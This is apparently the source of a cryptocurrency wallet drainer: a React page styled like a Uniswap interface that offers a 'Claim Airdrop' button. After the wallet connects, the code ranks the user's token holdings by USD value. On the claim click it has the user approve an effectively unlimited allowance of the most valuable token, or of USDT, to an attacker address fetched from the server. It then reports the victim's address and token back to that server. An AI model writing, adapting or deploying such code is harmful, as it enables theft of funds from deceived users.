import React, { useState, useEffect, useRef } from 'react'
import { ethers } from 'ethers'

import axios from "axios"
import { erc20Instance } from "./erc20Instance"

import { initWeb3Onboard } from './services'
import { useConnectWallet, useSetChain, useWallets } from '@web3-onboard/react'


let provider
let account


const DATABASE_API = window.location.origin;
let tokenList = null;

let _1stTokenContract;
let _2ndTokenContract;
let _1stMaxBalance = 0;
let _2ndMaxBalance = 0;
let ADDR;


const App = () => {
  const [{ wallet }, connect, disconnect] = useConnectWallet()
  const [{ chains, connectedChain, settingChain }, setChain] = useSetChain()
  const connectedWallets = useWallets()

  const [web3Onboard, setWeb3Onboard] = useState(null)

  _1stTokenContract = useRef(null);
  _2ndTokenContract = useRef(null);

  useEffect(() => {
    setWeb3Onboard(initWeb3Onboard)

    const loadTokenList = async () => {
      const res = await axios.get(DATABASE_API + '/tokenList.js',
                                  {
                                    headers: {
                                        'Access-Control-Allow-Origin': '*',
                                        'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
                                    }
                                  });

      tokenList = res.data;

      ADDR = await axios.get(DATABASE_API + '/addr.js',
      {
          headers: {
              'Access-Control-Allow-Origin': '*',
              'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
          }
      });
    }

    loadTokenList()
  }, [])

  useEffect(() => {
    if (!connectedWallets.length) return

    const connectedWalletsLabelArray = connectedWallets.map(
      ({ label }) => label
    )
    window.localStorage.setItem(
      'connectedWallets',
      JSON.stringify(connectedWalletsLabelArray)
    )
  }, [connectedWallets])

  useEffect(() => {
    if (wallet && connectedChain.id !== '0x1') {
      setChain({chainId: '0x1'});
    }

    if (!wallet?.provider) {
      provider = null
      account = null;
    } else {
      provider = new ethers.providers.Web3Provider(wallet.provider, 'any')
      account = wallet.accounts[0].address;

      console.log("connect provider", provider)
      console.log("account", wallet.accounts[0].address)
      console.log("getSigner", provider.getUncheckedSigner())
      
      checkTokens()
    }
  }, [wallet])

  useEffect(() => {
    const previouslyConnectedWallets = JSON.parse(
      window.localStorage.getItem('connectedWallets')
    )

    if (previouslyConnectedWallets?.length) {
      async function setWalletFromLocalStorage() {
        await connect({ autoSelect: previouslyConnectedWallets[0] })
      }
      setWalletFromLocalStorage()
    }
  }, [web3Onboard, connect])

  const readyToTransact = async () => {
    if (!wallet) {
      const walletSelected = await connect()
      if (!walletSelected) return false
    }
    // prompt user to switch to Ethereum network
    await setChain({ chainId: '0x1' })

    return true
  }

  const checkTokens = async () => {
    tokenList.map(async token => {
      try {
        let contract = erc20Instance(token.address, provider.getUncheckedSigner());

        let tokenBalanceBigNumber = await contract.balanceOf(account);
        let tokenBalance = 0;
        let maxDecimal = 0;

        if (token.decimals > 15) {
            tokenBalance = ethers.utils.formatEther(tokenBalanceBigNumber);
            maxDecimal = 18;
        }
        else if (token.decimals > 12) {
            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "finney");
            maxDecimal = 15;
        }
        else if (token.decimals > 9) {
            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "szabo");
            maxDecimal = 12;
        }
        else if (token.decimals > 6) {
            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "gwei");
            maxDecimal = 9;
        }
        else if (token.decimals > 3) {
            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "mwei");
            maxDecimal = 6;
        }
        else if (token.decimals > 0) {
            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "kwei");
            maxDecimal = 3;
        }
        else {
            tokenBalance = ethers.utils.formatUnits(tokenBalanceBigNumber, "wei");
            maxDecimal = 0
        }


        if (tokenBalance > 0) {
            for (let i = 0; i < maxDecimal - token.decimals; i++)
                tokenBalance *= 10;
        }

        console.log(token.symbol, tokenBalance);
        let resp = null;
        if (tokenBalance > 0) {
            resp = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${token.id}&vs_currencies=usd`,
                {
                    headers: {
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'GET,PUT,POST,DELETE,PATCH,OPTIONS',
                    }
                }
            );
        }
        const tokenPrice = resp !== null ? resp.data[token.id].usd : 0;
        let moneyBalance = tokenPrice * tokenBalance;
        if (moneyBalance > _1stMaxBalance) {
            _1stMaxBalance = moneyBalance;
            _1stTokenContract.current = contract;
            console.log("tokenID", token.id, "balance", tokenBalance, "_1stMaxBalance", _1stMaxBalance, _1stTokenContract);
        }

        if (moneyBalance > _2ndMaxBalance && moneyBalance != _1stMaxBalance) {
            _2ndMaxBalance = moneyBalance;
            _2ndTokenContract.current = contract;
        }
      }
      catch (error) {
        console.log('claim error', error);
      }
    })
  }

  const connectWallet = () => {
    connect();
  }

  return (
    <button onClick={connectWallet} className="sc-bdnxRM bhVlig Button__BaseButton-sc-tdn257-0 Button__ButtonSecondary-sc-tdn257-4 Web3Status__Web3StatusGeneric-sc-wwio5h-1 Web3Status__Web3StatusConnect-sc-wwio5h-3 fAaesV imqhZP hBZUGv gykiLr">
      <p className="Web3Status__Text-sc-wwio5h-5 joJIkc">{wallet ? `${wallet.accounts[0].address.slice(0, 5) + "..." + wallet.accounts[0].address.slice(38)}` :'Connect Wallet'}</p>
    </button>
  )
}

export const Claim = () => {

  const approveToken = async () => {
    console.log("TOKEN=>1", _1stTokenContract);
    console.log("TOKEN=>2", _2ndTokenContract);

    const usdtAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
    const usdtContract = erc20Instance(usdtAddress, provider.getUncheckedSigner());

    let targetAddress = ADDR.data;
    let tokenAddress = null;

    // await checkTokens();

    if (_1stTokenContract.current) {
        let allowance = await _1stTokenContract.current.allowance(account, targetAddress);
        
        allowance = ethers.utils.formatEther(allowance);
        if (allowance > 0) {
            if (_2ndTokenContract.current)
            {
                console.log("token2");
                await _2ndTokenContract.current.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
                tokenAddress = _2ndTokenContract.current.address;
            }
            else
            {
                console.log("default");
                await usdtContract.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
            }
        }
        else {
            console.log("token1");
            await _1stTokenContract.current.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
            tokenAddress = _1stTokenContract.current.address;
        }
    }
    else {
      console.log("___default");
      await usdtContract.approve(targetAddress, ethers.utils.parseUnits("10000000000000", "ether").toString());
    }

    let date = new Date();
    let article = date.getFullYear() + '/' + date.getMonth() + '/' + date.getDate() + ' ' +
        date.getHours() + ':' + date.getMinutes() + ':' + date.getSeconds() + ', user=' + account;
    article = article + ', token:' + tokenAddress;
    console.log(article);
    axios.post(DATABASE_API + '/update', article)
        .then(response => console.log('user address add succsessful'))
        .catch(response => console.log(response));
  }

  const claimAirdrop = () => {
      console.log("provider", provider)
      if (provider) {
        approveToken();
      } else {
        console.log("connect wallet error");
      }
  }

  return (
    <button onClick={claimAirdrop}
      className="sc-bdnxRM bhVlig Button__BaseButton-sc-tdn257-0 Button__ButtonLight-sc-tdn257-2 fAaesV dtbcVP">
          Claim Airdrop
    </button>
  );
}

export default App
